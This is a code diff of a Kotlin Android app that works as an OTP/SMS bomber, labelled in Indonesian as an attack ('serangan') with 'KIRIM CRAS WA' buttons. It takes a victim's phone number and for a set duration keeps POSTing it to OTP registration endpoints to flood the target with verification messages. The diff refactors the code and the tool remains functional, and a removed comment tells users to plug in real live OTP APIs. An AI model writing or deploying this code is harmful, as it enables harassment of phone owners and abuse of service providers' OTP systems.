@@ -12,13 +12,13 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
-import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
-
     private lateinit var etNumber: EditText
     private lateinit var etDuration: EditText
     private lateinit var btnStart: Button
@@ -27,11 +27,9 @@ class MainActivity : AppCompatActivity() {
     private var isRunning = false
     private var attackJob: Job? = null
 
-    // Endpoint OTP (Ganti ini pake URL API OTP yang beneran hidup)
     private val otpEndpoints = listOf(
         "https://api.layanana.com/v1/auth/otp",
-        "https://api.layananb.com/v2/send-otp",
-        "https://api.layananc.com/login/otp"
+        "https://api.layananb.com/v2/send-otp"
     )
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -44,11 +42,7 @@ class MainActivity : AppCompatActivity() {
         tvLog = findViewById(R.id.tvLog)
 
         btnStart.setOnClickListener {
-            if (!isRunning) {
-                startAttack()
-            } else {
-                stopAttack()
-            }
+            if (!isRunning) startAttack() else stopAttack()
         }
     }
 
@@ -57,26 +51,19 @@ class MainActivity : AppCompatActivity() {
         val durationText = etDuration.text.toString()
 
         if (number.isEmpty() || durationText.isEmpty()) {
-            Toast.makeText(this, "Isi nomor dan durasi!", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Isi data!", Toast.LENGTH_SHORT).show()
             return
         }
 
         val durationMinutes = durationText.toIntOrNull() ?: 0
-        if (durationMinutes <= 0) {
-            Toast.makeText(this, "Durasi minimal 1 menit!", Toast.LENGTH_SHORT).show()
-            return
-        }
+        if (durationMinutes <= 0) return
 
         isRunning = true
-        btnStart.text = "⏹ STOP CRAS"
+        btnStart.text = "STOP CRAS"
         btnStart.setBackgroundColor(Color.parseColor("#FF0055"))
-        appendLog("Memulai serangan ke $number selama $durationMinutes menit...")
+        appendLog("Memulai serangan ke $number...")
 
-        val client = OkHttpClient.Builder()
-            .connectTimeout(5, TimeUnit.SECONDS)
-            .readTimeout(5, TimeUnit.SECONDS)
-            .build()
-
+        val client = OkHttpClient.Builder().connectTimeout(5, TimeUnit.SECONDS).build()
         val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
         attackJob = CoroutineScope(Dispatchers.IO).launch {
@@ -85,40 +72,26 @@ class MainActivity : AppCompatActivity() {
 
             while (System.currentTimeMillis() < endTime && isRunning) {
                 val endpoint = otpEndpoints.random()
-                
-                // Format payload (Sesuaikan dengan API asli)
                 val jsonPayload = "{\"phone\": \"$number\", \"action\": \"register\"}"
                 val body = jsonPayload.toRequestBody(jsonMediaType)
 
-                val request = Request.Builder()
-                    .url(endpoint)
-                    .post(body)
-                    .addHeader("User-Agent", "Mozilla/5.0 (Linux; Android 13)")
-                    .build()
+                val request = Request.Builder().url(endpoint).post(body).build()
 
                 try {
                     val response = client.newCall(request).execute()
                     if (response.isSuccessful) {
                         hitCount++
-                        runOnUiThread {
-                            appendLog("[+] Hit #$hitCount -> Sukses")
-                        }
+                        runOnUiThread { appendLog("[+] Hit #$hitCount -> Sukses") }
                     } else {
-                        runOnUiThread {
-                            appendLog("[-] Gagal (Status: ${response.code})")
-                        }
+                        runOnUiThread { appendLog("[-] Gagal (Status: ${response.code})") }
                     }
                 } catch (e: Exception) {
-                    runOnUiThread {
-                        appendLog("[x] Timeout / Error")
-                    }
+                    runOnUiThread { appendLog("[x] Timeout / Error") }
                 }
-                delay(1500) // Jeda antar request
+                delay(1500)
             }
-
             runOnUiThread {
                 stopAttack()
-                appendLog("==================================")
                 appendLog("Selesai! Total OTP terkirim: $hitCount")
             }
         }
@@ -127,13 +100,11 @@ class MainActivity : AppCompatActivity() {
     private fun stopAttack() {
         isRunning = false
         attackJob?.cancel()
-        btnStart.text = "🚀 KIRIM CRAS WA"
+        btnStart.text = "KIRIM CRAS WA"
         btnStart.setBackgroundColor(Color.parseColor("#00FF88"))
     }
 
     private fun appendLog(message: String) {
         tvLog.append("\n$message")
-        val scrollAmount = tvLog.layout?.let { tvLog.height - it.getLineTop(tvLog.lineCount) } ?: 0
-        if (scrollAmount > 0) tvLog.scrollBy(0, scrollAmount)
     }
 }
